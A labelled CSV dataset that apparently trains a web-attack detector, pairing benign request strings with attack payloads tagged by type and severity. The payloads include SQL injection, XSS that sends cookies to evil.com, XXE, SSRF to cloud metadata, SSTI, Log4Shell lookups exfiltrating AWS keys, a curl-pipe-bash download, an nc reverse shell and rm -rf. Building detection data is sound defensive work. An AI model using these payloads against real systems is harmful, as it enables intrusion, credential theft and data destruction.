text,label,attack_type,severity
X-Forwarded-For: | ifconfig,1,command_injection,critical
"GET /page?id=%3Cdetails%20open%20ontoggle=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
User-Agent: |%20crontab%20-l,1,command_injection,critical
"GET /page?id=http://100.100.100.200/latest/meta-data/ HTTP/1.1
Host: target.com",1,ssrf,high
load data from red,0,normal,none
delete item id=size,0,normal,none
"GET /search?input=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/convert.base64-encode/resource=/etc/passwd%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E HTTP/1.1
Host: target.com",1,xxe,high
User-Agent: %3Csvg%20onload=alert%28document.domain%29%3E,1,xss,medium
User-Agent: 1%27%20AND%20%28SELECT%20COUNT%28*%29%20FROM%20information_schema.tables%29%3E0--,1,sql_injection,high
User-Agent: <IMG SRC=javascript:alert('XSS')>,1,xss,medium
"GET /page?id=%3Cscript%3Ealert%281%29%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=${j${::-n}di:ldap://evil.com/a}",1,log4shell,critical
search query for size,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3CIMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert%28%27XSS%27%29%3E",1,xss,medium
Referer: http://target.com/?q={{''.class.mro()[1].subclasses()}},1,ssti,high
"X-Forwarded-For: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xxe;</foo>",1,xxe,high
upload image photo_xml.jpg,0,normal,none
%3Cscript%3Edocument.location=%27http://evil.com/steal?c=%27+document.cookie%3C/script%3E,1,xss,medium
%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
X-Forwarded-For: ' OR '1'='1,1,sql_injection,high
"GET /page?id=Authorization:%20Basic%20dGVzdDp0ZXN0 HTTP/1.1
Host: target.com",1,brute_force,low
"POST /api/orders body={{""item"":""csv""}}",0,normal,none
"GET /search?input={{%27%27|attr%28%27__class__%27%29|attr%28%27__base__%27%29|attr%28%27__subclasses__%27%29%28%29}} HTTP/1.1
Host: target.com",1,ssti,high
GET /products/cameras HTTP/1.1,0,normal,none
;%20chmod%20777%20/etc/passwd,1,command_injection,critical
GET /users/de/profile HTTP/1.1,0,normal,none
User-Agent: %3Bcat%20/etc/passwd,1,command_injection,critical
{{range.constructor%28%27return%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22id%22%29%27%29%28%29}},1,ssti,high
User-Agent: admin' #,1,sql_injection,high
"GET /page?id=http://[::1]/admin HTTP/1.1
Host: target.com",1,ssrf,high
"GET /page?id=http://0.0.0.0/ HTTP/1.1
Host: target.com",1,ssrf,high
view page number name,0,normal,none
username=february&action=login,0,normal,none
X-Forwarded-For: %27%20OR%20%271%27=%271%27%20/*,1,sql_injection,high
User-Agent: %27;%20DROP%20TABLE%20users--,1,sql_injection,high
Referer: http://target.com/?q=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22http://evil.com/xxe%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
GET /docs/faq.html,0,normal,none
POST /api/cart add item=web-development,0,normal,none
User-Agent: %3Cimg%20src=x%20onerror=alert%281%29%3E,1,xss,medium
X-Forwarded-For: |%20netstat%20-an,1,command_injection,critical
"GET /search?input=%27%20OR%20%271%27=%271%27-- HTTP/1.1
Host: target.com",1,sql_injection,high
Referer: http://target.com/?q=....//....//....//etc/passwd,1,path_traversal,medium
"GET /search?input=;%20chmod%20777%20/etc/passwd HTTP/1.1
Host: target.com",1,command_injection,critical
"GET /page?id=file:///etc/shadow HTTP/1.1
Host: target.com",1,path_traversal,medium
search query for invoice-2024,0,normal,none
delete item id=faq,0,normal,none
"GET /search?input=' OR 1=1-- HTTP/1.1
Host: target.com",1,sql_injection,high
GET /images/electronics.png,0,normal,none
username=admin&password=123456,1,brute_force,low
"X-Forwarded-For: id=1%20AND%201=CONVERT%28int,@@version%29--",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cdetails%20open%20ontoggle=alert%281%29%3E",1,xss,medium
PUT /api/users/de/settings,0,normal,none
upload image photo_database.jpg,0,normal,none
Referer: http://target.com/?q=1%20OR%201=1/*,1,sql_injection,high
GET /blog/january HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=1%27%20AND%20%28SELECT%20COUNT%28*%29%20FROM%20information_schema.tables%29%3E0--",1,sql_injection,high
"GET /page?id=' GROUP BY 1-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /search?input=login=admin&pass=admin HTTP/1.1
Host: target.com",1,brute_force,low
{{7*'7'}},1,ssti,high
User-Agent: %3C!DOCTYPE%20foo%20[%3C!ENTITY%20%%20xxe%20SYSTEM%20%22http://evil.com/evil.dtd%22%3E%20%xxe;]%3E,1,xxe,high
;%20ipconfig,1,command_injection,critical
create new post title=services,0,normal,none
filter results by category=web-development,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cscript%3Edocument.location=%27http://evil.com/steal?c=%27+document.cookie%3C/script%3E",1,xss,medium
"GET /search?input=SELECT%20*%20FROM%20users%20WHERE%20id=1%20OR%201=1 HTTP/1.1
Host: target.com",1,sql_injection,high
X-Forwarded-For: %27%20GROUP%20BY%201--,1,sql_injection,high
GET /category/1/items,0,normal,none
GET /users/summary-q3/profile HTTP/1.1,0,normal,none
X-Forwarded-For: 1'; DROP TABLE users--,1,sql_injection,high
"GET /page?id=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: target.com",1,ssrf,high
GET /docs/products.html,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=username=admin&password=password",1,brute_force,low
"GET /page?id=email=admin@admin.com&password=admin HTTP/1.1
Host: target.com",1,brute_force,low
' AND EXISTS(SELECT * FROM users)--,1,sql_injection,high
User-Agent: ../../../../etc/shadow,1,path_traversal,medium
X-Forwarded-For: http://0.0.0.0/,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=1;%20SELECT%20pg_sleep%285%29--",1,sql_injection,high
PUT /api/users/faq/settings,0,normal,none
"GET /search?input=../../../../etc/hostname HTTP/1.1
Host: target.com",1,path_traversal,medium
User-Agent: %3Cstyle%3E*{background:url%28%27javascript:alert%281%29%27%29}%3C/style%3E,1,xss,medium
Referer: http://target.com/?q={{config.items%28%29}},1,ssti,high
"POST /api/data HTTP/1.1
Host: target.com

input=http://10.0.0.1/admin",1,ssrf,high
1; EXEC xp_cmdshell('dir c:\')--,1,sql_injection,high
1; SELECT pg_sleep(5)--,1,sql_injection,high
"POST /api/feedback body={{""message"":""csv""}}",0,normal,none
"GET /search?input=http://0.0.0.0/ HTTP/1.1
Host: target.com",1,ssrf,high
"GET /page?id=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'> HTTP/1.1
Host: target.com",1,xss,medium
<img src=x onerror=alert('XSS')>,1,xss,medium
search=%27%20OR%201=1--&submit=Search,1,sql_injection,high
Referer: http://target.com/?q=http://169.254.169.254/latest/user-data,1,ssrf,high
User-Agent: SELECT%20*%20FROM%20users%20WHERE%20id=1%20OR%201=1,1,sql_injection,high
User-Agent: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a},1,log4shell,critical
<iframe src=javascript:alert(1)>,1,xss,medium
Referer: http://target.com/?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,1,xss,medium
http://metadata.google.internal/computeMetadata/v1/,1,ssrf,high
"GET /page?id=%3C/script%3E%3Cscript%3Ealert%281%29%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
PUT /api/users/green/settings,0,normal,none
username=de&action=login,0,normal,none
view page number machine-learning,0,normal,none
create new post title=javascript,0,normal,none
GET /docs/1.html,0,normal,none
Referer: http://target.com/?q=%27%20AND%20EXISTS%28SELECT%20*%20FROM%20users%29--,1,sql_injection,high
export report cameras,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=http://172.16.0.1/admin",1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=1%20AND%20%28SELECT%20SUBSTRING%28username,1,1%29%20FROM%20users%20WHERE%20username=%27admin%27%29=%27a%27",1,sql_injection,high
User-Agent: %3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,1,xss,medium
X-Forwarded-For: %27;%20EXEC%20xp_cmdshell%28%27whoami%27%29--,1,sql_injection,high
;%20curl%20http://evil.com/shell.sh%20|%20bash,1,command_injection,critical
..\..\..\boot.ini,1,path_traversal,medium
"GET /search?input=|%20uname%20-a HTTP/1.1
Host: target.com",1,command_injection,critical
"GET /search?input=SELECT * FROM users WHERE id=1 OR 1=1 HTTP/1.1
Host: target.com",1,sql_injection,high
1%27%20OR%201=1--,1,sql_injection,high
User-Agent: ../../../etc/passwd,1,path_traversal,medium
Referer: http://target.com/?q=1%27;%20DROP%20TABLE%20users--,1,sql_injection,high
User-Agent: ..%2f..%2f..%2fetc%2fpasswd,1,path_traversal,medium
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,1,path_traversal,medium
GET /api/status?service=alice,0,normal,none
"X-Forwarded-For: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]><foo>&xxe;</foo>",1,xxe,high
Referer: http://target.com/?q=../../../../var/www/html/config.php,1,path_traversal,medium
1' AND 1=1--,1,sql_injection,high
User-Agent: {{request.environ}},1,ssti,high
%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1,xss,medium
export report xml,0,normal,none
1;%20EXEC%20xp_cmdshell%28%27dir%20c:\%27%29--,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=`ls%20-la`",1,command_injection,critical
POST /api/cart add item=faq,0,normal,none
X-Forwarded-For: 1%27%20ORDER%20BY%201--,1,sql_injection,high
sort items by csv ascending,0,normal,none
X-Forwarded-For: %3CIMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert%28%27XSS%27%29%3E,1,xss,medium
1' AND (SELECT * FROM users) > 0--,1,sql_injection,high
"GET /page?id=%27%20OR%201=1# HTTP/1.1
Host: target.com",1,sql_injection,high
X-Forwarded-For: |%20netstat%20-an,1,command_injection,critical
User-Agent: %3Csvg%20onload=alert%28document.domain%29%3E,1,xss,medium
User-Agent: username=admin&password=admin,1,brute_force,low
GET /blog/user123 HTTP/1.1,0,normal,none
"GET /search?input=|%20rm%20-rf%20/ HTTP/1.1
Host: target.com",1,command_injection,critical
"GET /page?id=%3Cvideo%20src=x%20onerror=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
GET /products/ar HTTP/1.1,0,normal,none
"GET /search?input={{config.items%28%29}} HTTP/1.1
Host: target.com",1,ssti,high
User-Agent: ${jndi:ldap://evil.com/${java:version}},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20OR%20%271%27=%271%27%20/*",1,sql_injection,high
GET /api/status?service=fr,0,normal,none
User-Agent: onmouseover=alert%281%29,1,xss,medium
"GET /page?id=| ls -la HTTP/1.1
Host: target.com",1,command_injection,critical
Referer: http://target.com/?q=file:///c:/boot.ini,1,path_traversal,medium
Referer: http://target.com/?q=1 OR 1=1/*,1,sql_injection,high
X-Forwarded-For: %3Cbody%20onload=alert%281%29%3E,1,xss,medium
User-Agent: admin%27/*,1,sql_injection,high
User-Agent: $(cat /etc/passwd),1,command_injection,critical
X-Forwarded-For: %27%20OR%201=1#,1,sql_injection,high
`cat /etc/passwd`,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cselect%20onchange=alert%281%29%3E%3Coption%3E1%3C/option%3E%3C/select%3E",1,xss,medium
User-Agent: 1' AND 1=1--,1,sql_injection,high
"GET /search?input=id=1%20AND%201=CONVERT%28int,@@version%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
"Referer: http://target.com/?q=%27%20AND%201=CONVERT%28int,@@version%29--",1,sql_injection,high
X-Forwarded-For: %3C?xml?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///proc/self/environ%22%3E]%3E,1,xxe,high
"GET /search?input=username=postgres&password=postgres HTTP/1.1
Host: target.com",1,brute_force,low
"GET /search?input=%27%20UNION%20SELECT%20NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=<img src=x onerror=alert(1)>",1,xss,medium
User-Agent: username=admin&password=password123,1,brute_force,low
User-Agent: javascript:alert%281%29,1,xss,medium
User-Agent: username=test&password=test,1,brute_force,low
"GET /page?id=`ls -la` HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/orders body={{""item"":""home""}}",0,normal,none
filter results by category=laptops,0,normal,none
X-Forwarded-For: ../../../../home/user/.ssh/id_rsa,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=ftp://127.0.0.1:21",1,ssrf,high
${jndi:ldap://evil.com/${env:AWS_ACCESS_KEY_ID}},1,log4shell,critical
"User-Agent: <#assign ex=""freemarker.template.utility.Execute""?new()>${ex(""id"")}",1,ssti,high
"GET /search?input=%3Cinput%20autofocus%20onfocus=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
GET /users/size/profile HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=$%28jndi:ldap://evil.com/a%29",1,log4shell,critical
"GET /search?input=%3Csvg%20onload=alert%28document.domain%29%3E HTTP/1.1
Host: target.com",1,xss,medium
Referer: http://target.com/?q=http://[::1]/admin,1,ssrf,high
X-Forwarded-For: ../../../../etc/hosts,1,path_traversal,medium
User-Agent: ../../../../etc/hostname,1,path_traversal,medium
User-Agent: admin%27/*,1,sql_injection,high
X-Forwarded-For: %27%20OR%20%271%27=%271%27%20/*,1,sql_injection,high
"GET /search?input=javascript:alert%281%29 HTTP/1.1
Host: target.com",1,xss,medium
"content-type: application/json
body: {{""name"":""25""}}",0,normal,none
X-Forwarded-For: username=administrator&password=administrator,1,brute_force,low
"1%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29,1,1%29%29%3E64--",1,sql_injection,high
User-Agent: ../../../../etc/passwd,1,path_traversal,medium
Referer: http://target.com/?q=;%20cat%20/etc/shadow,1,command_injection,critical
GET /images/mobile-apps.png,0,normal,none
view page number jane_smith,0,normal,none
view page number 3,0,normal,none
User-Agent: |%20chmod%20+s%20/bin/bash,1,command_injection,critical
${jndi:ldaps://evil.com/a},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%3C#assign%20ex=%22freemarker.template.utility.Execute%22?new%28%29%3E${ex%28%22id%22%29}",1,ssti,high
"GET /search?input=file:///etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
../../../../var/log/apache2/access.log,1,path_traversal,medium
Referer: http://target.com/?q=..\..\..\windows\win.ini,1,path_traversal,medium
GET /products/cameras HTTP/1.1,0,normal,none
PUT /api/users/january/settings,0,normal,none
PUT /api/users/3/settings,0,normal,none
"GET /page?id=${jndi:ldap://169.254.169.254/a} HTTP/1.1
Host: target.com",1,log4shell,critical
view page number green,0,normal,none
"GET /search?input=http://127.0.0.1:9200 HTTP/1.1
Host: target.com",1,ssrf,high
User-Agent: ../../../../etc/shadow,1,path_traversal,medium
user=root&password=123456,1,brute_force,low
"POST /api/orders body={{""item"":""xlsx""}}",0,normal,none
delete item id=february,0,normal,none
"GET /search?input={{[].__class__.__base__.__subclasses__%28%29}} HTTP/1.1
Host: target.com",1,ssti,high
Referer: http://target.com/?q=<audio src=x onerror=alert(1)>,1,xss,medium
filter results by category=red,0,normal,none
GET /api/status?service=xlsx,0,normal,none
X-Forwarded-For: %27;%20EXEC%20xp_cmdshell%28%27whoami%27%29--,1,sql_injection,high
Referer: http://target.com/?q=onmouseover=alert%281%29,1,xss,medium
Referer: http://target.com/?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/a},1,log4shell,critical
User-Agent: | crontab -l,1,command_injection,critical
User-Agent: |%20netstat%20-an,1,command_injection,critical
"POST /api/orders body={{""item"":""home""}}",0,normal,none
"'""><script>alert(1)</script>",1,xss,medium
User-Agent: %3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
"GET /page?id=dict://127.0.0.1:6379/info HTTP/1.1
Host: target.com",1,ssrf,high
PUT /api/users/mobile-apps/settings,0,normal,none
User-Agent: 1;%20SELECT%20pg_sleep%285%29--,1,sql_injection,high
%3Ciframe%20onload=alert%281%29%3E,1,xss,medium
Referer: http://target.com/?q=${jndi:ldaps://evil.com/a},1,log4shell,critical
"GET /search?input=$%28id%29 HTTP/1.1
Host: target.com",1,command_injection,critical
User-Agent: %27%20GROUP%20BY%201--,1,sql_injection,high
"GET /search?input=%3Csvg%20onload=alert%28document.domain%29%3E HTTP/1.1
Host: target.com",1,xss,medium
X-Forwarded-For: username=admin&password=,1,brute_force,low
"GET /search?input=%3Cscript%3Ealert%281%29%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
edit comment id=laptops,0,normal,none
"GET /search?input=%3Cscript%3Ealert%281%29%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
edit comment id=en,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cscript%3Ealert%281%29%3C/script%3E",1,xss,medium
"GET /page?id=expect://id HTTP/1.1
Host: target.com",1,path_traversal,medium
User-Agent: %0a%20ls%20-la,1,command_injection,critical
GET /blog/smartphones HTTP/1.1,0,normal,none
%0a%20cat%20/etc/passwd,1,command_injection,critical
filter results by category=blue,0,normal,none
"GET /page?id=username=superuser&password=superuser HTTP/1.1
Host: target.com",1,brute_force,low
GET /docs/3.html,0,normal,none
User-Agent: %27%20OR%20%271%27=%271,1,sql_injection,high
GET /docs/laptops.html,0,normal,none
onmouseover=alert%281%29,1,xss,medium
User-Agent: next=http://127.0.0.1:8080,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=gopher://127.0.0.1:9200/_cat/indices",1,ssrf,high
create new post title=cloud-computing,0,normal,none
export report summary-q3,0,normal,none
Referer: http://target.com/?q=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22http://evil.com/xxe%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
Referer: http://target.com/?q=127.0.0.1%20&&%20whoami,1,command_injection,critical
"GET /page?id=%3Cscript%3Edocument.location=%27http://evil.com/steal?c=%27+document.cookie%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
POST /api/cart add item=txt,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=http://127.0.0.1#evil.com",1,ssrf,high
Referer: http://target.com/?q=ftp://127.0.0.1:21,1,ssrf,high
"GET /search?input=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
X-Forwarded-For: 1 UNION SELECT table_name FROM information_schema.tables,1,sql_injection,high
Referer: http://target.com/?q=%3Cinput%20autofocus%20onfocus=alert%281%29%3E,1,xss,medium
User-Agent: ../../../../var/log/apache2/access.log,1,path_traversal,medium
GET /users/summary-q3/profile HTTP/1.1,0,normal,none
GET /images/tablets.png,0,normal,none
"GET /search?input={{%27%27.__class__.__mro__[2].__subclasses__%28%29}} HTTP/1.1
Host: target.com",1,ssti,high
/etc/passwd%00,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cbody%20onload=alert%281%29%3E",1,xss,medium
User-Agent: http://127.0.0.1:8080/admin,1,ssrf,high
GET /docs/smartphones.html,0,normal,none
"GET /page?id=%3Cimg%20src=x%20onerror=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
X-Forwarded-For: 1; EXEC xp_cmdshell('dir c:\')--,1,sql_injection,high
view page number tablets,0,normal,none
load data from alice,0,normal,none
"GET /search?input=|%20nc%20evil.com%204444%20-e%20/bin/sh HTTP/1.1
Host: target.com",1,command_injection,critical
User-Agent: | netstat -an,1,command_injection,critical
"POST /api/orders body={{""item"":""tablets""}}",0,normal,none
"GET /page?id=Authorization:%20Basic%20YWRtaW46YWRtaW4= HTTP/1.1
Host: target.com",1,brute_force,low
Referer: http://target.com/?q=../../../../etc/passwd%00,1,path_traversal,medium
PUT /api/users/services/settings,0,normal,none
X-Forwarded-For: ../../../../etc/hosts,1,path_traversal,medium
Referer: http://target.com/?q=redirect=http://169.254.169.254,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=username=admin&password=",1,brute_force,low
User-Agent: %3Cobject%20data=javascript:alert%281%29%3E,1,xss,medium
upload image photo_tablets.jpg,0,normal,none
GET /docs/summary-q3.html,0,normal,none
127.0.0.1;%20ls,1,command_injection,critical
sort items by products ascending,0,normal,none
download file about.pdf,0,normal,none
load data from data-science,0,normal,none
"GET /search?input=%3Cmeta%20http-equiv=%27refresh%27%20content=%270;url=javascript:alert%281%29%27%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=;%20cat%20/etc/passwd",1,command_injection,critical
Referer: http://target.com/?q=|%20netstat%20-an,1,command_injection,critical
User-Agent: Authorization:%20Basic%20cm9vdDpyb290,1,brute_force,low
onmouseover=alert%281%29,1,xss,medium
Referer: http://target.com/?q=<IMG SRC=javascript:alert('XSS')>,1,xss,medium
"GET /page?id=;%20whoami HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=username=tomcat&password=tomcat",1,brute_force,low
GET /api/status?service=about,0,normal,none
%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20lolz%20[%3C!ENTITY%20lol%20%22lol%22%3E%3C!ENTITY%20lol9%20%22&lol;&lol;&lol;%22%3E]%3E%3Cfoo%3E&lol9;%3C/foo%3E,1,xxe,high
Referer: http://target.com/?q=%3Cscript%3Edocument.location=%27http://evil.com/steal?c=%27+document.cookie%3C/script%3E,1,xss,medium
POST /api/cart add item=faq,0,normal,none
X-Forwarded-For: ../../../etc/passwd,1,path_traversal,medium
search query for name,0,normal,none
edit comment id=january,0,normal,none
X-Forwarded-For: ..\..\..\..\windows\system32\drivers\etc\hosts,1,path_traversal,medium
${${::-j}ndi:ldap://evil.com/a},1,log4shell,critical
"%27%20UNION%20SELECT%20NULL,NULL,NULL--",1,sql_injection,high
X-Forwarded-For: ; ls -la,1,command_injection,critical
username=about&action=login,0,normal,none
"GET /page?id=& cat /etc/passwd HTTP/1.1
Host: target.com",1,command_injection,critical
GET /images/bob.png,0,normal,none
"GET /page?id=../../../../var/log/apache2/access.log HTTP/1.1
Host: target.com",1,path_traversal,medium
User-Agent: username=admin&password=admin,1,brute_force,low
callback=http://internal-service/secret,1,ssrf,high
"User-Agent: 1%20AND%20%28SELECT%20SUBSTRING%28username,1,1%29%20FROM%20users%20WHERE%20username=%27admin%27%29=%27a%27",1,sql_injection,high
GET /search?q=february&page=1,0,normal,none
Authorization:%20Basic%20cm9vdDpyb290,1,brute_force,low
Referer: http://target.com/?q=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20lolz%20[%3C!ENTITY%20lol%20%22lol%22%3E%3C!ENTITY%20lol9%20%22&lol;&lol;&lol;%22%3E]%3E%3Cfoo%3E&lol9;%3C/foo%3E,1,xxe,high
User-Agent: | uname -a,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=redirect=http://169.254.169.254",1,ssrf,high
create new post title=price,0,normal,none
Referer: http://target.com/?q=${jndi:ldap://evil.com/a},1,log4shell,critical
User-Agent: ..%2f..%2f..%2fetc%2fpasswd,1,path_traversal,medium
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,1,path_traversal,medium
GET /blog/red HTTP/1.1,0,normal,none
' GROUP BY 1--,1,sql_injection,high
User-Agent: http://127.0.0.1#evil.com,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=${jndi:ldap://evil.com/${java:os}}",1,log4shell,critical
GET /products/report-january HTTP/1.1,0,normal,none
X-Forwarded-For: javascript:alert(1),1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=xmlns:xi=%22http://www.w3.org/2001/XInclude%22%3E%3Cxi:include%20parse=%22text%22%20href=%22file:///etc/passwd%22/%3E",1,xxe,high
Referer: http://target.com/?q=username=user&password=user,1,brute_force,low
Referer: http://target.com/?q=file:///c:/windows/win.ini,1,path_traversal,medium
Referer: http://target.com/?q=%3Cimg%20src=x%20onerror=alert%281%29%3E,1,xss,medium
..././..././..././etc/passwd,1,path_traversal,medium
|%20crontab%20-l,1,command_injection,critical
"GET /search?input=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd HTTP/1.1
Host: target.com",1,path_traversal,medium
User-Agent: <video src=x onerror=alert(1)>,1,xss,medium
sort items by electronics ascending,0,normal,none
"GET /page?id=$%28cat%20/etc/passwd%29 HTTP/1.1
Host: target.com",1,command_injection,critical
"GET /page?id=%27%20UNION%20SELECT%20NULL,NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
X-Forwarded-For: ${${::-j}ndi:ldap://evil.com/a},1,log4shell,critical
GET /images/txt.png,0,normal,none
filter results by category=report-january,0,normal,none
"GET /page?id=%3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E HTTP/1.1
Host: target.com",1,xss,medium
GET /images/order-12345.png,0,normal,none
"GET /search?input=zip://path/to/file.zip#file.php HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=....\....\....\etc\passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
GET /images/contact.png,0,normal,none
X-Forwarded-For: file:///etc/passwd,1,path_traversal,medium
X-Forwarded-For: |%20chmod%20+s%20/bin/bash,1,command_injection,critical
create new post title=ar,0,normal,none
filter results by category=1,0,normal,none
Referer: http://target.com/?q=|%20ifconfig,1,command_injection,critical
"GET /page?id=%27%20OR%20%271%27=%271 HTTP/1.1
Host: target.com",1,sql_injection,high
X-Forwarded-For: javascript:alert(1),1,xss,medium
User-Agent: file:///etc/passwd,1,path_traversal,medium
GET /users/green/profile HTTP/1.1,0,normal,none
"GET /search?input=' UNION SELECT NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /search?input=|%20ls%20-la HTTP/1.1
Host: target.com",1,command_injection,critical
%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
load data from cameras,0,normal,none
"GET /search?input=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=<div style='background:url(javascript:alert(1))'>",1,xss,medium
ldap://127.0.0.1:389,1,ssrf,high
filter results by category=alice,0,normal,none
User-Agent: &%20cat%20/etc/passwd,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=javascript:alert%281%29",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=id=1%20AND%201=CONVERT%28int,@@version%29--",1,sql_injection,high
User-Agent: %3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20data%20[%3C!ELEMENT%20data%20ANY%3E%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E%3Cdata%3E&file;%3C/data%3E,1,xxe,high
sort items by john_doe ascending,0,normal,none
Referer: http://target.com/?q=%0a%20ls%20-la,1,command_injection,critical
